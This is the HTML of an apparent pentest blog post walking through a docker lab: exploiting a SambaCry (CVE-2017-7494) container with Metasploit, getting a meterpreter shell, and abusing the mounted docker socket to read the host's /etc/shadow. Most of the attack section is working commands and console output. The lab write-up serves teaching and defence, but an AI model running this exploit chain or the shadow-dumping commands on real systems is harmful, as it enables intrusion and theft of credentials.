@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="generator" content="Hugo 0.48" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="/index.xml" type="application/rss+xml" title="OPSXCQ Blog">
+<title>Abusing insecure docker deployments - OPSXCQ Blog</title>
+</head>
+<body>
+
+<header>
+  <div class="container clearfix">
+    <a class="path" href="https://strm.sh/">[OPSXCQ Blog]</a>
+    <span class="caret"># _</span>
+    <div class="right">
+      
+    </div>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2018-11-10">November 10, 2018</time></span>
+
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="/tags/docker">docker</a>
+
+        <a href="/tags/pentest">pentest</a>
+
+        <a href="/tags/attack">attack</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Abusing insecure docker deployments</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Is possible to abuse and escape from containers in several scenarios, in this
+post I will explore the most basic one: abusing the docker socket to escape the
+container and run code as <em>root</em> in the host machine.</p>
+
+<!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-refresh-toc -->
+
+<p><strong>Table of Contents</strong></p>
+
+<ul>
+<li><a href="#lab-setup">Lab setup</a></li>
+<li><a href="#attack">Attack</a>
+
+<ul>
+<li><a href="#information-gathering">Information gathering</a></li>
+<li><a href="#getting-access">Getting access</a></li>
+<li><a href="#escalating-privileges">Escalating privileges</a></li>
+</ul></li>
+</ul>
+
+<!-- markdown-toc end -->
+
+<h1 id="lab-setup">Lab setup</h1>
+
+<p>Since we will be using containers, you have to install
+<a href="https://docker.com">docker</a> to be able to run this lab.</p>
+
+<h3 id="create-the-network">Create the network</h3>
+
+<p>The very first step is to create a docker network where those containers will be
+created, so they can talk with each other:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">docker network create pwnage </code></pre></div>
+<h3 id="start-the-vulnerable-container">Start the vulnerable container</h3>
+
+<p>For this example, we will use a container vulnerable to <strong>CVE-2017-7494</strong>, also
+known as Samba Cry vulnerability. If you are interested in reading more about it
+please check this repository
+<a href="https://github.com/opsxcq/exploit-CVE-2017-7494">opsxcq/exploit-CVE-2017-7494</a>.</p>
+
+<p>This vulnerability allow you to get remote code execution in a Samba server, we
+will add the docker socket to the container, so we will have an example of
+misusing docker.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">docker run --rm -it <span style="color:#ed9d13">\
+</span><span style="color:#ed9d13"></span>       --name vulnerable <span style="color:#ed9d13">\
+</span><span style="color:#ed9d13"></span>       --network pwnage <span style="color:#ed9d13">\
+</span><span style="color:#ed9d13"></span>       -v <span style="color:#ed9d13">&#39;/var/run/docker.sock:/var/run/docker.sock&#39;</span> <span style="color:#ed9d13">\
+</span><span style="color:#ed9d13"></span>       vulnerables/cve-2017-7494</code></pre></div>
+<h3 id="start-the-attacker">Start the attacker</h3>
+
+<p>To complete our environment we will need to add the attacker host to the
+network. There is an exploit in the Samba Cry repository, but instead we will be
+using Metasploit because it is easier to upload what is needed. There is an
+image already build for that, just run the command bellow and everything will
+run as needed for this lab:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">docker run --rm -it <span style="color:#ed9d13">\
+</span><span style="color:#ed9d13"></span>       --network pwnage <span style="color:#ed9d13">\
+</span><span style="color:#ed9d13"></span>       -v <span style="color:#ed9d13">&#39;/usr/bin/docker:/docker:ro&#39;</span> <span style="color:#ed9d13">\
+</span><span style="color:#ed9d13"></span>       strm/metasploit</code></pre></div>
+<p>After it is loaded you will be presented to this screen</p>
+
+<p><img src="https://raw.githubusercontent.com/opsxcq/docker-metasploit/master/print.png" alt="metasploit" /></p>
+
+<h1 id="attack">Attack</h1>
+
+<h2 id="information-gathering">Information gathering</h2>
+
+<p>In any attack, the first thing to do is to gather information about the target.
+So let&rsquo;s first check the connectivity by pinging the <strong>vulnerable</strong> container.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ping -c <span style="color:#3677a9">2</span> vulnerable </code></pre></div>
+<p>If everything is OK you should expect an output like</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf5 &gt; ping -c <span style="color:#3677a9">2</span> vulnerable 
+[*] exec: ping -c <span style="color:#3677a9">2</span> vulnerable 
+
+PING vulnerable (<span style="color:#3677a9">172</span>.20.0.2) <span style="color:#3677a9">56</span>(<span style="color:#3677a9">84</span>) bytes of data.
+<span style="color:#3677a9">64</span> bytes from vulnerable.pwnage (<span style="color:#3677a9">172</span>.20.0.2): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">1</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">64</span> <span style="color:#40ffff">time</span>=<span style="color:#3677a9">0</span>.120 ms
+<span style="color:#3677a9">64</span> bytes from vulnerable.pwnage (<span style="color:#3677a9">172</span>.20.0.2): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">2</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">64</span> <span style="color:#40ffff">time</span>=<span style="color:#3677a9">0</span>.097 ms
+
+--- vulnerable ping statistics ---
+<span style="color:#3677a9">2</span> packets transmitted, <span style="color:#3677a9">2</span> received, <span style="color:#3677a9">0</span>% packet loss, <span style="color:#24909d">time</span> 1009ms
+rtt min/avg/max/mdev = <span style="color:#3677a9">0</span>.097/0.108/0.120/0.015 ms</code></pre></div>
+<p>Then we proceed to a basic smb shares enumeration with:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">use auxiliary/scanner/smb/smb_enumshares
+<span style="color:#24909d">set</span> rhosts vulnerable
+run</code></pre></div>
+<p>The expected output is</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf5 &gt; use auxiliary/scanner/smb/smb_enumshares
+msf5 auxiliary(scanner/smb/smb_enumshares) &gt; <span style="color:#24909d">set</span> rhosts vulnerable
+<span style="color:#40ffff">rhosts</span> =&gt; vulnerable
+msf5 auxiliary(scanner/smb/smb_enumshares) &gt; run
+
+[+] <span style="color:#3677a9">172</span>.20.0.2:139        - data - (DS) Data
+[+] <span style="color:#3677a9">172</span>.20.0.2:139        - IPC$ - (I) IPC Service (Crying samba)
+[*] vulnerable:           - Scanned <span style="color:#3677a9">1</span> of <span style="color:#3677a9">1</span> hosts (<span style="color:#3677a9">100</span>% <span style="color:#24909d">complete</span>)
+[*] Auxiliary module execution completed</code></pre></div>
+<p>It show us that there is a share named <strong>data</strong> in this samba server.</p>
+
+<h2 id="getting-access">Getting access</h2>
+
+<p>Next step is to run the exploit against the host so we can obtain a shell. In
+Metasploit this vulnerability is named <strong>is_known_pipename</strong> and is located in
+<code>exploit/linux/samba/is_known_pipename</code>.</p>
+
+<p>Run the command bellow to attack the host:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">use exploit/linux/samba/is_known_pipename
+<span style="color:#24909d">set</span> RHOST vulnerable
+<span style="color:#24909d">set</span> RPORT <span style="color:#3677a9">445</span>
+<span style="color:#24909d">set</span> payload linux/x64/meterpreter/bind_tcp
+<span style="color:#24909d">set</span> TARGET <span style="color:#3677a9">3</span>
+<span style="color:#24909d">set</span> SMB_FOLDER data
+<span style="color:#24909d">set</span> SMBUser sambacry
+<span style="color:#24909d">set</span> SMBPass nosambanocry
+exploit</code></pre></div>
+<p>If everything runs fine, you should be presented with a <strong>meterpreter</strong> shell like:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msf5 &gt; use exploit/linux/samba/is_known_pipename
+msf5 exploit(linux/samba/is_known_pipename) &gt; <span style="color:#24909d">set</span> RHOST vulnerable
+<span style="color:#40ffff">RHOST</span> =&gt; vulnerable
+msf5 exploit(linux/samba/is_known_pipename) &gt; <span style="color:#24909d">set</span> RPORT <span style="color:#3677a9">445</span>
+<span style="color:#40ffff">RPORT</span> =&gt; <span style="color:#3677a9">445</span>
+msf5 exploit(linux/samba/is_known_pipename) &gt; <span style="color:#24909d">set</span> payload linux/x64/meterpreter/bind_tcp
+<span style="color:#40ffff">payload</span> =&gt; linux/x64/meterpreter/bind_tcp
+msf5 exploit(linux/samba/is_known_pipename) &gt; <span style="color:#24909d">set</span> TARGET <span style="color:#3677a9">3</span>
+<span style="color:#40ffff">TARGET</span> =&gt; <span style="color:#3677a9">3</span>
+msf5 exploit(linux/samba/is_known_pipename) &gt; <span style="color:#24909d">set</span> SMB_FOLDER data
+<span style="color:#40ffff">SMB_FOLDER</span> =&gt; data
+msf5 exploit(linux/samba/is_known_pipename) &gt; <span style="color:#24909d">set</span> SMBUser sambacry
+<span style="color:#40ffff">SMBUser</span> =&gt; sambacry
+msf5 exploit(linux/samba/is_known_pipename) &gt; <span style="color:#24909d">set</span> SMBPass nosambanocry
+<span style="color:#40ffff">SMBPass</span> =&gt; nosambanocry
+msf5 exploit(linux/samba/is_known_pipename) &gt; exploit
+
+[*] vulnerable:445 - Using location <span style="color:#ed9d13">\\</span>vulnerable<span style="color:#ed9d13">\d</span>ata<span style="color:#ed9d13">\ </span><span style="color:#6ab825;font-weight:bold">for</span> the path
+[*] vulnerable:445 - Retrieving the remote path of the share <span style="color:#ed9d13">&#39;data&#39;</span>
+[*] vulnerable:445 - Share <span style="color:#ed9d13">&#39;data&#39;</span> has server-side path <span style="color:#a61717;background-color:#e3d2d2">&#39;</span>/data
+[*] vulnerable:445 - Uploaded payload to <span style="color:#ed9d13">\\</span>vulnerable<span style="color:#ed9d13">\d</span>ata<span style="color:#ed9d13">\s</span>hyyEPPk.so
+[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using <span style="color:#ed9d13">\\</span>PIPE<span style="color:#ed9d13">\/</span>data/shyyEPPk.so...
+[-] vulnerable:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using /data/shyyEPPk.so...
+[-] vulnerable:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] Started <span style="color:#24909d">bind</span> TCP handler against vulnerable:4444
+[*] Sending stage (<span style="color:#3677a9">816260</span> bytes) to vulnerable
+
+meterpreter &gt; </code></pre></div>
+<h2 id="escalating-privileges">Escalating privileges</h2>
+
+<p>To escalate privileges we will abuse the docker socket being available inside
+the container. Since <code>dockerd</code> runs as root in the host machine, it has root
+permissions so we can abuse it to do several things. For example using
+<code>--privileged</code> can give you several extended capabilities, the text bellow
+explaining them was extracted from the official docker documentation:</p>
+
+<blockquote>
+<p>By default, Docker containers are “unprivileged” and cannot, for example, run a
+Docker daemon inside a Docker container. This is because by default a
+container is not allowed to access any devices, but a “privileged” container
+is given access to all devices (see the documentation on cgroups devices).
+When the operator executes docker run &ndash;privileged, Docker will enable access
+to all devices on the host as well as set some configuration in AppArmor or
+SELinux to allow the container nearly all the same access to the host as
+processes running outside containers on the host.</p>
+</blockquote>
+
+<p>You can access devices with <code>--device</code>, but in our case, we will map the root
+file system (<code>/</code>) to the container and have access to it.</p>
+
+<p>Since there is no docker client inside this container, the next step is to
+setup the docker client and its dependencies inside our target container. Just
+run the command bellow and everything will be done.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">upload /docker /docker
+upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
+chmod <span style="color:#3677a9">777</span> /docker
+chmod +x /docker</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">meterpreter &gt; upload /docker /docker
+[*] uploading  : /docker -&gt; /docker
+[*] Uploaded -1.00 B of <span style="color:#3677a9">36</span>.36 MiB (<span style="color:#3677a9">0</span>.0%): /docker -&gt; /docker
+[*] Uploaded -1.00 B of <span style="color:#3677a9">36</span>.36 MiB (<span style="color:#3677a9">0</span>.0%): /docker -&gt; /docker
+[*] Uploaded -1.00 B of <span style="color:#3677a9">36</span>.36 MiB (<span style="color:#3677a9">0</span>.0%): /docker -&gt; /docker
+[*] Uploaded -1.00 B of <span style="color:#3677a9">36</span>.36 MiB (<span style="color:#3677a9">0</span>.0%): /docker -&gt; /docker
+[*] Uploaded -1.00 B of <span style="color:#3677a9">36</span>.36 MiB (<span style="color:#3677a9">0</span>.0%): /docker -&gt; /docker
+[*] uploaded   : /docker -&gt; /docker
+meterpreter &gt; upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
+[*] uploading  : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -&gt; /usr/lib/x86_64-linux-gnu/libltdl.so.7
+[*] Uploaded -1.00 B of <span style="color:#3677a9">38</span>.47 KiB (-0.0%): /usr/lib/x86_64-linux-gnu/libltdl.so.7 -&gt; /usr/lib/x86_64-linux-gnu/libltdl.so.7
+[*] uploaded   : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -&gt; /usr/lib/x86_64-linux-gnu/libltdl.so.7
+meterpreter &gt; chmod <span style="color:#3677a9">777</span> /docker
+meterpreter &gt; chmod +x /docker
+meterpreter &gt; </code></pre></div>
+<p>And finally, using docker to have access to the host file system.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">execute -f /docker -i -H -c -a <span style="color:#ed9d13">&#34;run --rm -v &#39;/:/rootfs&#39; debian:9.2 cat /rootfs/etc/shadow&#34;</span></code></pre></div>
+<p>And that is it, you&rsquo;ve escaped the container and dumped the machine local user
+hashes, the output will look like:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">meterpreter &gt; execute -f /docker -i -H -c -a <span style="color:#ed9d13">&#34;run --rm -v &#39;/:/rootfs&#39; debian:9.2 cat /rootfs/etc/shadow&#34;</span>
+Process <span style="color:#3677a9">113</span> created.
+Channel <span style="color:#3677a9">13</span> created.
+root:<span style="color:#40ffff">$1$UFKdtFGw$qp29y1qGWit</span>/vnvIG0uSr1:17488:0:99999:7:::
+daemon:*:17488:0:99999:7:::
+bin:*:17488:0:99999:7:::
+sys:*:17488:0:99999:7:::
+sync:*:17488:0:99999:7:::
+games:*:17488:0:99999:7:::
+man:*:17488:0:99999:7:::
+lp:*:17488:0:99999:7:::
+mail:*:17488:0:99999:7:::
+news:*:17488:0:99999:7:::</code></pre></div>
+<h1 id="references">References</h1>
+
+<ul>
+<li><a href="https://github.com/opsxcq/docker-metasploit">Metasploit docker image</a></li>
+<li><a href="https://github.com/opsxcq/exploit-CVE-2017-7494">Vulnerable container</a></li>
+</ul>
+
+  </section>
+</article>
+
+</main>
+
+</div>
+
+<footer>
+  <div class="container">
+      <span class="copyright">&copy; 2019 OPSXCQ Blog - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Register.StartupHook("End Jax",function () {
+  var BROWSER = MathJax.Hub.Browser;
+  var jax = "HTML-CSS";
+  if (BROWSER.isMSIE && BROWSER.hasMathPlayer) jax = "NativeMML";
+  if (BROWSER.isFirefox) jax = "SVG";
+  if (BROWSER.isSafari && BROWSER.versionAtLeast("5.0")) jax = "NativeMML";
+  return MathJax.Hub.setRenderer(jax);
+});
+</script>
+
+<script type="text/javascript" async
+        src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    MathJax.Hub.Config({
+    tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+    extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    }
+    });
+    MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+    all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+
+  MathJax.Hub.Config({
+  
+  TeX: { equationNumbers: { autoNumber: "AMS" } }
+  });
+</script>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-43399052-10"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-43399052-10');
+</script>
+
+
+</body>
+</html>
+
